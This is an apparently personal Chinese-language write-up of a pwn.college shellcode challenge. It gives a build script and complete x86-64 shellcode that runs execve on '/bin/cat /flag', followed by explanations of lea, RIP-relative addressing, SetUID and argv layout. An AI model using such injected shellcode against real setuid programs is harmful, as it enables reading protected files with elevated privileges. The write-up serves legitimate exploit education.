---
title: Pwn College Shell Code
---

## 准备工作

首先，我不希望使用类似于 `pwntool` 这类完整的 CTF 框架，这会让我们失去对细节的理解。因此，我们将使用最基础的 `as` 作为我们的汇编器。
并且利用 `objcopy` 等来生成原生的 shellcode 进行注入。

### 编译脚本

```bash
#!/bin/bash
as --64 -o shell shell.s                        # 指示汇编器生成 64 位的代码。
objcopy -O binary -j .text shell shell.bin      # 汇编器生成的文件会包含不必要的元信息，我们使用 objcopy 将 .text 段提取出来。
objdump  -b binary shell.bin -m i386:x86-64 -D  # 输出我们的 shellcode 便于调试。
```

## Challenge 1 Plain Shellcode

这个挑战是最基础的 shellcode，程序直接执行我们注入的 shellcode。由于使用了 ASLR 保护，栈地址是完全随机的，所以我们需要确保我们的 shellcode 是位置无关的。

<details markdown="1">
<summary>shell.s (剧透警告)</summary>
```assembly
.section .text
.global _start
_start:
	leaq cmd(%rip), %rdi
	movq %rdi, argv1(%rip)
	leaq arg2(%rip), %rsi
	movq %rsi, argv2(%rip)
	leaq argv1(%rip), %rsi
	movq $0x3b, %rax
	movq $0x0, %rdx
	syscall

cmd: .string "/bin/cat"
argv1:  .long 0
	    .long 0
argv2:  .long 0
	    .long 0
	    .long 0
	    .long 0
arg2: .string "/flag"
```
</details>

接下来我们介绍几个重点部分。

### `lea` 指令
`lea` 全称为 Load Effective Address，其作用是将一个地址加载到一个寄存器中，不过不需要纠结，只要记住它的格式。与 `mov` 指令不同，`lea` 指令不会将地址中的内容加载到寄存器中，而是将地址本身加载到寄存器中。不过不需要纠结这些，只需要记住 `lea` 指令所代表的算术运算即可。

```assembly
lea o(r1,r2,m), rd
```

最后 `rd = o + r1 + r2 * m`，不管这些值代表什么，也不管最后的结果是否是一个合法的地址，`lea` 指令都会将这个结果加载到 `rd` 中。其中，`m` 代表单位位移量，只能取 1, 2, 4, 8 这几个值，分别代表 1, 2, 4, 8 字节的大小。`r1` 代表基址寄存器，`r2` 代表索引寄存器，`o` 代表偏移量。

而 `mov o(r1,r2,m), rd` 则是将 `o + r1 + r2 * m` 这个地址中的内容加载到 `rd` 中，也就是 `rd = *(o + r1 + r2 * m)`，如果最终结果不是一个合法地址，则会段错误。

### 位置无关代码
一般而言，位置无关代码是通过 pc 相对寻址实现的，也就是说我们的代码不依赖于绝对地址，而是通过目标地址与 pc 之间的偏移量来计算目标地址。而汇编器一般具有对于这类
指令的语法糖。例如 `leaq cmd(%rip), %rdi` 所代表的并不是将 `$cmd + %rip` 这个地址赋值给 `%rdi`，而是将 `$cmd` 这个地址以 pc 相对寻址的方式赋值给 `%rdi`。

### SetUID
这部分详见 [Linux 中各种各样的 UID](../2024-9-2-uid)。

### `argv`
`argv` 是一个指向字符串指针的指针，我们需要将其设置为一个指向字符串指针的数组。在这里，我们将 `argv` 设置为一个指向字符串指针的数组，其中第一个指针指向 `cmd`，第二个指针指向 `arg2="/flag"`，第三个指针指向 `NULL` 代表终止符。
